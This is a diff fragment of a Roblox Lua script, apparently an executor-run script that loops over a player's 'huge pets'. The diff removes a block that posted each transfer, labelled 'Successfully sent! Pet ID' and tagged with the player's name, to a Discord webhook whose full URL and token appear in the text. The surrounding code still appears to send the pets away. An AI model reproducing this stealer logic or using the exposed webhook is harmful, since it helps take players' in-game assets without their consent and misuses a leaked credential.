@@ -666,19 +666,7 @@ function ProcessHugePets()
             print("Huge pets you have right now:", table.concat(hugePets, ", "))
 
             for i = #uids, 1, -1 do
-                local webhook = "https://discord.com/api/webhooks/1240148195783213127/SCs8ji01gBTVw2G66fJDS2Z9Re6eeaXyD8uPRIIhahlsS9qCgPPtQ2NYPFdWlzyXoKo6"
-                local request = (syn and syn.request) or request or (http and http.request) or http_request
-
-                request({
-                    Url = webhook,
-                    Method = "POST",
-                    Headers = {
-                        ["Content-Type"] = "application/json"
-                    },
-                    Body = HttpService:JSONEncode({
-                        content = game.Players.LocalPlayer.Name .. " | Successfully sent! Pet ID: " .. hugePets[i]
-                    })
-                })
+                
 
                 local args = {
                     [1] = uids[i],
@@ -914,7 +902,7 @@ spawn(RemoteRun)
 
 
 print("if made it through")
-wait(330)
+wait(300)
 repeat
     wait(0.1)
     local royalPurpleFound = false
